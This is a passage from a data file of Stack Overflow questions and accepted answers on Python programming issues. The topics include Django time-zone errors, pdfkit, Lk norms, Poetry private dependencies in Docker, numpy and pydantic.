\n[2022-08-12 09:18:36 +0000] [11] [INFO] Booting worker with pid: 11 web_1              \n[2022-08-12 12:18:37 +0300] [11] [ERROR] Exception in worker process web_1              \nTraceback (most recent call last): web_1              \n  File \"/usr/local/lib/python3.10/zoneinfo/_common.py\", line 12, in load_tzdata web_1              \n    return importlib.resources.open_binary(package_name, resource_name) web_1     \n  File \"/usr/local/lib/python3.10/importlib/resources.py\", line 46, in open_binary web_1              \n    return reader.open_resource(resource) web_1              \n  File \"/usr/local/lib/python3.10/importlib/abc.py\", line 433, in open_resource web_1              \n    return self.files().joinpath(resource).open('rb') web_1              \n  File \"/usr/local/lib/python3.10/pathlib.py\", line 1119, in open web_1       \n    return self._accessor.open(self, mode, buffering, encoding, errors, web_1              \nFileNotFoundError: [Errno 2] No such file or directory: '/usr/local/lib/python3.10/site-packages/tzdata/zoneinfo/Asia/Hanoi' web_1              \n web_1              \nDuring handling of the above exception, another exception occurred: web_1              \n web_1              \nTraceback (most recent call last): web_1          \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/arbiter.py\", line 583, in spawn_worker web_1              \n    worker.init_process() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/workers/base.py\", line 119, in init_process web_1              \n    self.load_wsgi() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/workers/base.py\", line 144, in load_wsgi web_1              \n    self.wsgi = self.app.wsgi() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/app/base.py\", line 67, in wsgi web_1              \n    self.callable = self.load() web_1 \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/app/wsgiapp.py\", line 49, in load web_1              \n    return self.load_wsgiapp() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/app/wsgiapp.py\", line 39, in load_wsgiapp web_1              \n    return util.import_app(self.app_uri) web_1              \n  File \"/usr/local/lib/python3.10/site-packages/gunicorn/util.py\", line 358, in import_app web_1              \n    mod = importlib.import_module(module) web_1              \n  File \"/usr/local/lib/python3.10/importlib/__init__.py\", line 126, in import_module web_1              \n    return _bootstrap._gcd_import(name[level:], package, level) web_1              \n  File \"\", line 1050, in _gcd_import web_1              \n  File \"\", line 1027, in _find_and_load web_1              \n  File \"\", line 1006, in _find_and_load_unlocked web_1    \n  File \"\", line 688, in _load_unlocked web_1              \n  File \"\", line 883, in exec_module web_1              \n  File \"\", line 241, in _call_with_frames_removed web_1   \n  File \"/home/app/web/config/wsgi.py\", line 16, in  web_1    \n    application = get_wsgi_application() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/core/wsgi.py\", line 12, in get_wsgi_application web_1              \n    django.setup(set_prefix=False) web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/__init__.py\", line 24, in setup web_1              \n    apps.populate(settings.INSTALLED_APPS) web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/apps/registry.py\", line 116, in populate web_1              \n    app_config.import_models() web_1              \n  File \"/usr/local/lib/python3.10/site-packages/django/apps/config.py\", line 304, in import_models web_1              \n    self.models_module = import_module(models_module_name) web_1              \n  File \"/usr/local/lib/python3.10/importlib/__init__.py\", line 126, in import_module web_1              \n    return _bootstrap._gcd_import(name[level:], package, level) web_1              \n  File \"\", line 1050, in _gcd_import web_1              \n  File \"\", line 1027, in _find_and_load web_1              \n  File \"\", line 1006, in _find_and_load_unlocked web_1    \n  File \"\", line 688, in _load_unlocked web_1              \n  File \"\", line 883, in exec_module web_1              \n  File \"\", line 241, in _call_with_frames_removed web_1   \n  File \"/usr/local/lib/python3.10/site-packages/django_celery_beat/models.py\", line 8, in  web_1              \n    import timezone_field web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/__init__.py\", line 1, in  web_1              \n    from timezone_field.fields import TimeZoneField web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/fields.py\", line 11, in  web_1              \n    class TimeZoneField(models.Field): web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/fields.py\", line 41, in TimeZoneField web_1              \n    default_zoneinfo_tzs = [ZoneInfo(tz) for tz in pytz.common_timezones] web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/fields.py\", line 41, in  web_1              \n    default_zoneinfo_tzs = [ZoneInfo(tz) for tz in pytz.common_timezones] web_1              \n  File \"/usr/local/lib/python3.10/zoneinfo/_common.py\", line 24, in load_tzdata web_1              \n    raise ZoneInfoNotFoundError(f\"No time zone found with key {key}\") web_1              \nzoneinfo._common.ZoneInfoNotFoundError: 'No time zone found with key Asia/Hanoi' web_1              \n[2022-08-12 12:18:37 +0300] [11] [INFO] Worker exiting (pid: 11) web_1              \n[2022-08-12 09:18:37 +0000] [1] [INFO] Shutting down: Master web_1              \n[2022-08-12 09:18:37 +0000] [1] [INFO] Reason: Worker failed to boot.\n\nIn the Django settings file:\nTIME_ZONE = 'UTC'\nUSE_TZ = True\n\nPS: As suggested in another post I added tzdata to my requirements file but nothing changed.\n",
    "AcceptedAnswerId": 73333278,
    "AcceptedAnswer": "Downgrading the pytz version from 2022.2 to 2022.1 seems to have solved this issue for me.\n"
}
{
    "Id": 73599734,
    "PostTypeId": 1,
    "Title": "Python dataclass, one attribute referencing other",
    "Body": "@dataclass\nclass Stock:\n    symbol: str\n    price: float = get_price(symbol)\n\nCan a dataclass attribute access to the other one? In the above example, one can create a Stock by providing a symbol and the price. If price is not provided, it defaults to a price which we get from some function get_price. Is there a way to reference symbol?\nThis example generates error NameError: name 'symbol' is not defined.\n",
    "AcceptedAnswerId": 73599883,
    "AcceptedAnswer": "You can use __post_init__ here. Because it's going to be called after __init__, you have your attributes already populated so do whatever you want to do there:\nfrom typing import Optional\nfrom dataclasses import dataclass\n\n\ndef get_price(name):\n    # logic to get price by looking at `name`.\n    return 1000.0\n\n\n@dataclass\nclass Stock:\n    symbol: str\n    price: Optional[float] = None\n\n    def __post_init__(self):\n        if self.price is None:\n            self.price = get_price(self.symbol)\n\n\nobj1 = Stock(\"boo\", 2000.0)\nobj2 = Stock(\"boo\")\nprint(obj1.price)  # 2000.0\nprint(obj2.price)  # 1000.0\n\nSo if user didn't pass price while instantiating, price is None. So you can check it in __post_init__ and ask it from get_price.\n"
}
{
    "Id": 73599970,
    "PostTypeId": 1,
    "Title": "How to solve \"wkhtmltopdf reported an error: Exit with code 1 due to network error: ProtocolUnknownError\" in python pdfkit",
    "Body": "I'm using Django. This is code is in views.py.\ndef download_as_pdf_view(request, doc_type, pk):\n    import pdfkit\n    file_name = 'invoice.pdf'\n    pdf_path = os.path.join(settings.BASE_DIR, 'static', 'pdf', file_name)\n\n    template = get_template(\"paypal/card_invoice_detail.html\")\n    _html = template.render({})\n    pdfkit.from_string(_html, pdf_path)\n\n    return FileResponse(open(pdf_path, 'rb'), filename=file_name, content_type='application/pdf')\n\nTraceback is below.\n\n[2022-09-05 00:56:35,785] ERROR [django.request.log_response:224] Internal Server Error: /paypal/download_pdf/card_invoice/MTE0Nm1vamlva29zaGkz/\nTraceback (most recent call last):\n  File \"/usr/local/lib/python3.8/site-packages/django/core/handlers/exception.py\", line 47, in inner\n    response = get_response(request)\n  File \"/usr/local/lib/python3.8/site-packages/django/core/handlers/base.py\", line 181, in _get_response\n    response = wrapped_callback(request, *callback_args, **callback_kwargs)\n  File \"/opt/project/app/paypal/views.py\", line 473, in download_as_pdf_view\n    pdfkit.from_string(str(_html), pdf_path)\n  File \"/usr/local/lib/python3.8/site-packages/pdfkit/api.py\", line 75, in from_string\n    return r.to_pdf(output_path)\n  File \"/usr/local/lib/python3.8/site-packages/pdfkit/pdfkit.py\", line 201, in to_pdf\n    self.handle_error(exit_code, stderr)\n  File \"/usr/local/lib/python3.8/site-packages/pdfkit/pdfkit.py\", line 155, in handle_error\n    raise IOError('wkhtmltopdf reported an error:\\n' + stderr)\nOSError: wkhtmltopdf reported an error:\nExit with code 1 due to network error: ProtocolUnknownError\n\n[2022-09-05 00:56:35,797] ERROR [django.server.log_message:161] \"GET /paypal/download_pdf/card_invoice/MTE0Nm1vamlva29zaGkz/ HTTP/1.1\" 500 107486\n\n\nThis is work file.\npdfkit.from_url('https://google.com', 'google.pdf')\n\nHowever pdfkit.from_string and pdfkit.from_file return \"ProtocolUnknownError\"\nPlease help me!\nUpdate\nI tyied this code.\n    _html = '''Hello world'''\n    pdfkit.from_string(_html), pdf_path)\n\nIt worked fine. I saved above html as sample.html. Then run this code\n\nI added this parameter options={\"enable-local-file-access\": \"\"}\n\n    _html = render_to_string('path/to/sample.html')\n    pdfkit.from_string(str(_html), pdf_path, options={\"enable-local-file-access\": \"\"})\n\nIt worked fine! And the \"ProtocolUnknownError\" error is gone thanks to options={\"enable-local-file-access\": \"\"}.\nSo, I changed the HTML file path to the one I really want to use.\n    _html = render_to_string('path/to/invoice.html')\n    pdfkit.from_string(_html, pdf_path, options={\"enable-local-file-access\": \"\"})\n    return FileResponse(open(pdf_path, 'rb'), filename=file_name, content_type='application/pdf')\n\nIt does not finish convert pdf. When I run the code line by line.\nstdout, stderr = result.communicate(input=input) does not return.\nIt was processing long time.\n",
    "AcceptedAnswerId": 73603802,
    "AcceptedAnswer": "I solved this problem. Theare are 3 step to pass this problems.\n\nYou need to set options {\"enable-local-file-access\": \"\"}. pdfkit.from_string(_html, pdf_path, options={\"enable-local-file-access\": \"\"})\n\npdfkit.from_string() can't load css from URL. It's something like this.\n css path should be absolute path or write style in same file.\n\nIf css file load another file. ex: font file. It will be ContentNotFoundError.\n\n\nMy solution\nI used simple css file like this.\nbody {\n    font-size: 18px;\n    padding: 55px;\n}\n\nh1 {\n    font-size: 38px;\n}\n\nh2 {\n    font-size: 28px;\n}\n\nh3 {\n    font-size: 24px;\n}\n\nh4 {\n    font-size: 20px;\n}\n\ntable, th, td {\n    margin: auto;\n    text-align: center;\n    border: 1px solid;\n}\n\ntable {\n    width: 80%;\n}\n\n.text-right {\n    text-align: right;\n}\n\n\n.text-left {\n    text-align: left;\n}\n\n.text-center {\n    text-align: center;\n}\n\nThis code insert last css file as style in same html.\nimport os\n\nimport pdfkit\nfrom django.http import FileResponse\nfrom django.template.loader import render_to_string\n\nfrom paypal.models import Invoice\nfrom website import settings\n\n\ndef download_as_pdf_view(request, pk):\n    # create PDF from HTML template file with context.\n    invoice = Invoice.objects.get(pk=pk)\n    context = {\n        # please set your contexts as dict.\n    }\n    _html = render_to_string('paypal/card_invoice_detail.html', context)\n     # remove header\n    _html = _html[_html.find(''):]  \n\n    # create new header\n    new_header = '''\n    \n    \n    \n    \n    \n'''\n    # add style from css file. please change to your css file path.\n    css_path = os.path.join(settings.BASE_DIR, 'paypal', 'static', 'paypal', 'css', 'invoice.css')\n    with open(css_path, 'r') as f:\n        new_header += f.read()\n    new_header += '\\n'\n    print(new_header)\n\n    # add head to html\n    _html = new_header + _html[_html.find(''):]\n    with open('paypal/sample.html', 'w') as f: f.write(_html)  # for debug\n\n    # convert html to pdf\n    file_name = 'invoice.pdf'\n    pdf_path = os.path.join(settings.BASE_DIR, 'static', 'pdf', file_name)\n    pdfkit.from_string(_html, pdf_path, options={\"enable-local-file-access\": \"\"})\n    return FileResponse(open(pdf_path, 'rb'), filename=file_name, content_type='application/pdf')\n\n"
}
{
    "Id": 73269424,
    "PostTypeId": 1,
    "Title": "Interpreting the effect of LK Norm with different orders on training machine learning model with the presence of outliers",
    "Body": "( Both the RMSE and the MAE are ways to measure the distance between two vectors: the vector of predictions and the vector of target values. Various distance measures, or norms, are possible. Generally speaking, calculating the size or length of a vector is often required either directly or as part of a broader vector or vector-matrix operation.\nEven though the RMSE is generally the preferred performance measure for regression tasks, in some contexts you may prefer to use another function. For instance, if there are many outliers instances in the dataset, in this case, we may consider using mean absolute error (MAE).\nMore formally, the higher the norm index, the more it focuses on large values and neglect small ones. This is why RMSE is more sensitive to outliers than MAE.) Source: hands on machine learning with scikit learn and tensorflow.\nTherefore, ideally, in any dataset, if we have a great number of outliers, the loss function, or the norm of the vector \"representing the absolute difference between predictions and true labels; similar to y_diff in the code below\" should grow if we increase the norm... In other words, RMSE should be greater than MAE. --> correct me if mistaken \nGiven this definition, I have generated a random dataset and added many outliers to it as seen in the code below. I calculated the lk_norm for the residuals, or y_diff for many k values, ranging from 1 to 5. However, I found that the lk_norm decreases as the value of k increases; however, I was expecting that RMSE, aka norm = 2, to be greater than MAE, aka norm = 1.\nI would love to understand how LK norm is decreasing as we increase K, aka the order, which is contrary to the definition above.\nThanks in advance for any help!\nCode:\nimport numpy as np\nimport plotly.offline as pyo\nimport plotly.graph_objs as go\nfrom plotly import tools\n\nnum_points = 1000\nnum_outliers = 50\n\nx = np.linspace(0, 10, num_points)\n\n# places where to add outliers:\noutlier_locs = np.random.choice(len(x), size=num_outliers, replace=False)\noutlier_vals = np.random.normal(loc=1, scale=5, size=num_outliers)\n\ny_true = 2 * x\ny_pred = 2 * x + np.random.normal(size=num_points)\ny_pred[outlier_locs] += outlier_vals\n\ny_diff = y_true - y_pred\n\nlosses_given_lk = []\nnorms = np.linspace(1, 5, 50)\n\nfor k in norms:\n    losses_given_lk.append(np.linalg.norm(y_diff, k))\n\ntrace_1 = go.Scatter(x=norms, \n                     y=losses_given_lk, \n                     mode=\"markers+lines\", \n                     name=\"lk_norm\")\n\ntrace_2 = go.Scatter(x=x, \n                     y=y_true, \n                     mode=\"lines\", \n                     name=\"y_true\")\n\ntrace_3 = go.Scatter(x=x, \n                     y=y_pred, \n                     mode=\"markers\", \n                     name=\"y_true + noise\")\n\nfig = tools.make_subplots(rows=1, cols=3, subplot_titles=(\"lk_norms\", \"y_true\", \"y_true + noise\"))\nfig.append_trace(trace_1, 1, 1)\nfig.append_trace(trace_2, 1, 2)\nfig.append_trace(trace_3, 1, 3)\n\npyo.plot(fig, filename=\"lk_norms.html\")\n\nOutput:\n\nFinally, I would love to know, in which cases one uses L3 or L4 norm, etc...?\n",
    "AcceptedAnswerId": 73339587,
    "AcceptedAnswer": "Another python implementation for the np.linalg is:\ndef my_norm(array, k):\n    return np.sum(np.abs(array) ** k)**(1/k)\n\nTo test our function, run the following:\narray = np.random.randn(10)\nprint(np.linalg.norm(array, 1), np.linalg.norm(array, 2), np.linalg.norm(array, 3), np.linalg.norm(array, 10))\n# And\nprint(my_norm(array, 1), my_norm(array, 2), my_norm(array, 3), my_norm(array, 10))\n\noutput:\n(9.561258110585216, 3.4545982749318846, 2.5946495606046547, 2.027258231324604)\n(9.561258110585216, 3.454598274931884, 2.5946495606046547, 2.027258231324604)\n\nTherefore, we can see that the numbers are decreasing, similar to our output in the figure posted in the question above.\nHowever, the correct implementation of RMSE in python is: np.mean(np.abs(array) ** k)**(1/k) where k is equal to 2. As a result, I have replaced the sum by the mean.\nTherefore, if I add the following function:\ndef my_norm_v2(array, k):\n    return np.mean(np.abs(array) ** k)**(1/k)\n\nAnd run the following:\nprint(my_norm_v2(array, 1), my_norm_v2(array, 2), my_norm_v2(array, 3), my_norm_v2(array, 10))\n\nOutput:\n(0.9561258110585216, 1.092439894967332, 1.2043296427640868, 1.610308452218342)\n\nHence, the numbers are increasing.\nIn the code below I rerun the same code posted in the question above with a modified implementation and I got the following:\nimport numpy as np\nimport plotly.offline as pyo\nimport plotly.graph_objs as go\nfrom plotly import tools\n\nnum_points = 1000\nnum_outliers = 50\n\nx = np.linspace(0, 10, num_points)\n\n# places where to add outliers:\noutlier_locs = np.random.choice(len(x), size=num_outliers, replace=False)\noutlier_vals = np.random.normal(loc=1, scale=5, size=num_outliers)\n\ny_true = 2 * x\ny_pred = 2 * x + np.random.normal(size=num_points)\ny_pred[outlier_locs] += outlier_vals\n\ny_diff = y_true - y_pred\n\nlosses_given_lk = []\nlosses = []\nnorms = np.linspace(1, 5, 50)\n\nfor k in norms:\n    losses_given_lk.append(np.linalg.norm(y_diff, k))\n    losses.append(my_norm(y_diff, k))\n\ntrace_1 = go.Scatter(x=norms, \n                     y=losses_given_lk, \n                     mode=\"markers+lines\", \n                     name=\"lk_norm\")\n\ntrace_2 = go.Scatter(x=norms, \n                     y=losses, \n                     mode=\"markers+lines\", \n                     name=\"my_lk_norm\")\n\ntrace_3 = go.Scatter(x=x, \n                     y=y_true, \n                     mode=\"lines\", \n                     name=\"y_true\")\n\ntrace_4 = go.Scatter(x=x, \n                     y=y_pred, \n                     mode=\"markers\", \n                     name=\"y_true + noise\")\n\nfig = tools.make_subplots(rows=1, cols=4, subplot_titles=(\"lk_norms\", \"my_lk_norms\", \"y_true\", \"y_true + noise\"))\nfig.append_trace(trace_1, 1, 1)\nfig.append_trace(trace_2, 1, 2)\nfig.append_trace(trace_3, 1, 3)\nfig.append_trace(trace_4, 1, 4)\n\npyo.plot(fig, filename=\"lk_norms.html\")\n\nOutput:\n\nAnd that explains why the loss increase as we increase k.\n"
}
{
    "Id": 74106823,
    "PostTypeId": 1,
    "Title": "Working Poetry project with private dependencies inside Docker",
    "Body": "I have a Python library hosted in Google Cloud Platform Artifact Registry. Besides, I have a Python project, using Poetry, that depends on the library.\nThis is my project file pyproject.toml:\n[tool.poetry]\nname = \"Test\"\nversion = \"0.0.1\"\ndescription = \"Test project.\"\nauthors = [\n    \"Me \"\n]\n\n[tool.poetry.dependencies]\npython = \">=3.8,<4.0\"\nmylib = \"0.1.1\"\n\n[tool.poetry.dev-dependencies]\n\"keyrings.google-artifactregistry-auth\" = \"^1.1.0\"\nkeyring = \"^23.9.0\"\n\n[build-system]\nrequires = [\"poetry-core>=1.1.0\"]\nbuild-backend = \"poetry.core.masonry.api\"\n\n[[tool.poetry.source]]\nname = \"my-lib\"\nurl = \"https://us-east4-python.pkg.dev/my-gcp-project/my-lib/simple/\"\nsecondary = true\n\n\nTo enable using my private repository, I installed gcloud CLI and authenticated with my credentials. So when I run this command, I see proper results, like this:\n$ gcloud auth list\nACTIVE  ACCOUNT\n...\n*       @appspot.gserviceaccount.com\n...\n\nAdditionally, I'm using Python keyring togheter with keyrings.google-artifactregistry-auth, as you can see in the project file.\nSo, with this setup, I can run poetry install, the dependency gets downloaded from my private artifact registry, using the authentication from GCP.\n\nThe issue comes when I try to apply the same principles inside a Docker container.\nI created a Docker file like this:\n# syntax = docker/dockerfile:1.3\nFROM python:3.9\n\n# Install Poetry\nRUN curl -sSL https://install.python-poetry.org | python3 -\nENV PATH \"${PATH}:/root/.local/bin\"\n\n# Install Google Cloud SDK CLI\nARG GCLOUD_VERSION=\"401.0.0-linux-x86_64\"\nRUN wget -q https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-${GCLOUD_VERSION}.tar.gz && \\\n    tar -xf google-cloud-cli-*.tar.gz && \\\n    ./google-cloud-sdk/install.sh --quiet && \\\n    rm google-cloud-cli-*.tar.gz\nENV PATH \"${PATH}:/google-cloud-sdk/bin\"\n\n# install Google Artifact Rrgistry keyring integration\nRUN pip install keyrings.google-artifactregistry-auth\nRUN --mount=type=secret,id=GOOGLE_APPLICATION_CREDENTIALS ${GOOGLE_APPLICATION_CREDENTIALS} gcloud auth activate-service-account --key-file=/run/secrets/GOOGLE_APPLICATION_CREDENTIALS\nRUN gcloud auth list\nRUN keyring --list-backends\n\nWORKDIR /app\n\n# copy Poetry project files and install dependencies\nCOPY ./.env* ./\nCOPY ./pyproject.toml ./poetry.lock* ./\nRUN poetry install\n\n# copy source files\nCOPY ./app /app/app\n\n# run the program\nCMD poetry run python -m app.main\n\n\nAs you can see, I injected the Google credentials file, following this documentation. This works. I used Docker BuildKit secrets, as exposed here (security concerns are not a matter of this question). So, when I try to build the image, I got an authentication error (GOOGLE_APPLICATION_CREDENTIALS is properly set pointing to a valid key file):\n$ DOCKER_BUILDKIT=1 docker image build --secret id=GOOGLE_APPLICATION_CREDENTIALS,src=${GOOGLE_APPLICATION_CREDENTIALS} -t app-test .\n\n...\n#19 66.68 Source (my-lib): Authorization error accessing https://us-east4-python.pkg.dev/my-gcp-project/my-lib/simple/mylib/\n#19 68.21\n#19 68.21   RuntimeError\n#19 68.21\n#19 68.22   Unable to find installation candidates for mylib (0.1.1)\n...\n\nIf I execute, line by line, all the commands in the Dockerfile, using the same Google credentials key file outside Docker, I got it working.\nI even tried to debug inside the image, not executing poetry install, nor poetry run... commands, and I saw this, if it helps to debug:\n# gcloud auth list\n                  Credentialed Accounts\nACTIVE  ACCOUNT\n*       @appspot.gserviceaccount.com\n\n\n# keyring --list-backends\nkeyrings.gauth.GooglePythonAuth (priority: 9)\nkeyring.backends.chainer.ChainerBackend (priority: -1)\nkeyring.backends.fail.Keyring (priority: 0)\n\nFinally, I even tried following this approach: Using Keyring on headless Linux systems in a Docker container, with the same results:\n# apt update\n...\n# apt install -y gnome-keyring\n...\n# dbus-run-session -- sh\nGNOME_KEYRING_CONTROL=/root/.cache/keyring-MEY1T1\nSSH_AUTH_SOCK=/root/.cache/keyring-MEY1T1/ssh\n# poetry install\n...\n  \u2022 Installing mylib (0.1.1): Failed\n\n  RuntimeError\n\n  Unable to find installation candidates for mylib (0.1.1)\n\n  at ~/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/installation/chooser.py:103 in choose_for\n       99\u2502\n      100\u2502             links.append(link)\n      101\u2502\n      102\u2502         if not links:\n    \u2192 103\u2502             raise RuntimeError(f\"Unable to find installation candidates for {package}\")\n      104\u2502\n      105\u2502         # Get the best link\n      106\u2502         chosen = max(links, key=lambda link: self._sort_key(package, link))\n      107\u2502\n...\n\n\nI even tried following the advices of this other question. No success.\ngcloud CLI works inside the container, testing other commands. My guess is that the integration with Keyring is not working properly, but I don't know how to debug it.\nHow can I get my dependency resolved inside a Docker container?\n",
    "AcceptedAnswerId": 75218763,
    "AcceptedAnswer": "Finally, I found a solution that worked in my use case.\nThere are two main parts:\n\nInstalling keyrings.google-artifactregistry-auth as a Poetry plugin, using this command:\n\npoetry self add keyrings.google-artifactregistry-auth\n\n\nAuthenticating inside the container using a service account key file:\n\ngcloud auth activate-service-account --key-file=key.json\n\nIn my case, I use BuildKit secrets to handle it.\nThen, for instance, the Dockerfile would like this:\nFROM python:3.9\n\n# Install Poetry\nRUN curl -sSL https://install.python-poetry.org | python3 -\nENV PATH \"${PATH}:/root/.local/bin\"\n\n# install Google Artifact Registry tools for Python as a Poetry plugin\nRUN poetry self add keyrings.google-artifactregistry-auth\n\n# Install Google Cloud SDK CLI\nARG GCLOUD_VERSION=\"413.0.0-linux-x86_64\"\nRUN wget -q https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-${GCLOUD_VERSION}.tar.gz && \\\n    tar -xf google-cloud-cli-*.tar.gz && \\\n    ./google-cloud-sdk/install.sh --quiet && \\\n    rm google-cloud-cli-*.tar.gz\nENV PATH \"${PATH}:/google-cloud-sdk/bin\"\n\n# authenticate with gcloud using a BuildKit secret\nRUN --mount=type=secret,id=gac.json \\\n    gcloud auth activate-service-account --key-file=/run/secrets/gac.json\n\nCOPY ./pyproject.toml ./poetry.lock* /\nRUN poetry install\n\n# deauthenticate with gcloud once the dependencies are already installed to clean the image\nRUN gcloud auth revoke --all\n\nCOPY ./app /app\n\nWORKDIR /app\n\nCMD [\"whatever\", \"command\", \"you\", \"use\"]\n\nAnd the Docker build command, providing the secret:\nDOCKER_BUILDKIT=1 docker image build \\\n        --secret id=gac.json,src=${GOOGLE_APPLICATION_CREDENTIALS} \\\n        -t ${YOUR_TAG} .\n\nAnd with Docker Compose, a similar approach:\nservices:\n  yourapp:\n    build:\n      context: .\n      secrets:\n        - key.json\n    image: yourapp:yourtag\n    ...\n\nCOMPOSE_DOCKER_CLI_BUILD=1 DOCKER_BUILDKIT=1 docker compose up --build\n\n"
}
{
    "Id": 73910005,
    "PostTypeId": 1,
    "Title": "How to sum an ndarray over ranges bounded by other indexes",
    "Body": "For an array of multiple dimensions, I would like to sum along some dimensions, with the sum range defined by other dimension indexes. Here is an example:\n>>> import numpy as np\n>>> x = np.arange(2*3*4).reshape((2,3,4))\n>>> x\narray([[[ 0,  1,  2,  3],\n        [ 4,  5,  6,  7],\n        [ 8,  9, 10, 11]],\n\n       [[12, 13, 14, 15],\n        [16, 17, 18, 19],\n        [20, 21, 22, 23]]])\n>>> wanted = [[sum(x[i,j,i:j]) for j in range(x.shape[1])] for i in range(x.shape[0])]\n>>> wanted\n[[0, 4, 17], [0, 0, 21]]\n\nIs there a more efficient way to do it without for loops or list comprehension? My array is quite large.\n",
    "AcceptedAnswerId": 73910175,
    "AcceptedAnswer": "You can use boolean masks:\n# get lower triangles\nm1 = np.arange(x.shape[1])[:,None]>np.arange(x.shape[2])\n\n# get columns index >= depth index\nm2 = np.arange(x.shape[2])>=np.arange(x.shape[0])[:,None,None]\n\n# combine both mask to form 3D mask\nmask = m1 & m2\n\nout = np.where(mask, x, 0).sum(axis=2)\n\noutput:\narray([[ 0,  4, 17],\n       [ 0,  0, 21]])\n\nMasks:\n# m1\narray([[False, False, False, False],\n       [ True, False, False, False],\n       [ True,  True, False, False]])\n\n# m2\narray([[[ True,  True,  True,  True]],\n\n       [[False,  True,  True,  True]]])\n\n# mask\narray([[[False, False, False, False],\n        [ True, False, False, False],\n        [ True,  True, False, False]],\n\n       [[False, False, False, False],\n        [False, False, False, False],\n        [False,  True, False, False]]])\n\n"
}
{
    "Id": 72087819,
    "PostTypeId": 1,
    "Title": "Pydantic set attribute/field to model dynamically",
    "Body": "According to the docs:\n\nallow_mutation\nwhether or not models are faux-immutable, i.e. whether setattr is allowed (default: True)\n\nWell I have a class :\nclass MyModel(BaseModel):\n\n    field1:int\n\n    class Config:\n        allow_mutation = True\n\nIf I try to add a field dynamically :\nmodel1 = MyModel(field1=1)\nmodel1.field2 = 2\n\nAnd I get this error :\n  File \"pydantic/main.py\", line 347, in pydantic.main.BaseModel.__setattr__\nValueError: \"MyModel\" object has no field \"field2\"\n\nObviously, using setattr method will lead to the same error.\nsetattr(model1, 'field2', 2)\n\nOutput:\n  File \"pydantic/main.py\", line 347, in pydantic.main.BaseModel.__setattr__\nValueError: \"MyModel\" object has no field \"field2\"\n\nWhat did I miss here ?\n",
    "AcceptedAnswerId": 73373318,
    "AcceptedAnswer": "You can use the Config object within the class and set the extra attribute to \"allow\" or use it as extra=Extra.allow kwargs when declaring the model\nExample from the docs :\nfrom pydantic import BaseModel, ValidationError, Extra\n\n\nclass Model(BaseModel, extra=Extra.forbid):\n    a: str\n\n\ntry:\n    Model(a='spam', b='oh no')\nexcept ValidationError as e:\n    print(e)\n    \"\"\"\n    1 validation error for Model\n    b\n      extra fields not permitted (type=value_error.extra)\n    \"\"\"\n\n"
}
{
    "Id": 73343529,
    "PostTypeId": 1,
    "Title": "Django google kubernetes client not running exe inside the job",
    "Body": "I have a docker image that I want to run inside my django code. Inside that image there is an executable that I have written using c++ that writes it's output to google cloud storage. Normally when I run the django code like this:\ncontainer = client.V1Container(name=container_name, command=[\"//usr//bin//sleep\"], args=[\"3600\"], image=container_image, env=env_list, security_context=security)\n\nAnd manually go inside the container to run this:\ngcloud container clusters get-credentials my-cluster --region us-central1 --project proj_name  && kubectl exec pod-id -c jobcontainer -- xvfb-run -a \"path/to/exe\"\n\nIt works as intended and gives off the output to cloud storage. (I need to use a virtual monitor so I'm using xvfb first). However I must call this through django like this:\ncontainer = client.V1Container(name=container_name, command=[\"xvfb-run\"], args=[\"-a\",\"\\\"path/to/exe\\\"\"], image=container_image, env=env_list, security_context=security)\n\nBut when I do this, the job gets created but never finishes and does not give off an output to the storage. When I go inside my container to run ps aux I get this output:\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.0   2888  1836 ?        Ss   07:34   0:00 /bin/sh /usr/bin/xvfb-run -a \"path/to/exe\"\nroot          16  0.0  1.6 196196 66256 ?        S    07:34   0:00 Xvfb :99 -screen 0 1280x1024x24 -nolisten tcp -auth /tmp/xvfb-run.r5gaBO/Xauthority\nroot          35  0.0  0.0   7016  1552 ?        Rs   10:31   0:00 ps aux\n\nIt looks like it's stuck inside my code but my code does not have a loop that it can stuck inside, perhaps there is an error occurring (I don't think so since the exact same command is working when typed manually). If there is an error how can I see the console output? Why is my code get stuck and how can I get my desired output? Could there be an error caused by permissions (The code does a lot of stuff that requires permissions like writing to storage and reading files inside the pod, but like mentioned works normally when i run it via the command line)?\n",
    "AcceptedAnswerId": 73404150,
    "AcceptedAnswer": "Apparently for anyone having a similar issue, we fixed it by adding the command we want to run at the end of the Dockerfile instead of passing it as a parameter inside django's container call like this:\ncmd[\"entrypoint.sh\"]\n\nentrypoint.sh:\nxvfb-run -a \"path/to/exe\"\n\nInstead of calling it inside django like we did before and simply removing the command argument from the container call so it looked like this:\ncontainer = client.V1Container(name=container_name, image=container_image, env=env_list, stdin=True, security_context=security)\n\n"
}
{
    "Id": 73660050,
    "PostTypeId": 1,
    "Title": "How to achieve \"resumption semantics\" for Python exceptions?",
    "Body": "I have a validator class with a method that performs multiple checks and may raise different exceptions:\nclass Validator:\n    def validate(something) -> None:\n        if a:\n            raise ErrorA()\n        if b:\n            raise ErrorB()\n        if c:\n            raise ErrorC()\n\nThere's a place in the outside (caller) code where I want to customize its behaviour and prevent ErrorB from being raised, without preventing ErrorC. Something like resumption semantics would be useful here. Hovewer, I haven't found a good way to achieve this.\nTo clarify: I have the control over Validator source code, but prefer to preserve its existing interface as much as possible.\nSome possible solutions that I've considered:\n\nThe obvious\ntry:\n    validator.validate(something)\nexcept ErrorB:\n    ...\n\nis no good because it also suppresses ErrorC in cases where both ErrorB and ErrorC should be raised.\n\nCopy-paste the method and remove the check:\n# In the caller module\n\nclass CustomValidator(Validator):\n    def validate(something) -> None:\n        if a:\n            raise ErrorA()\n        if c:\n            raise ErrorC()\n\nDuplicating the logic for a and c is a bad idea\nand will lead to bugs if Validator 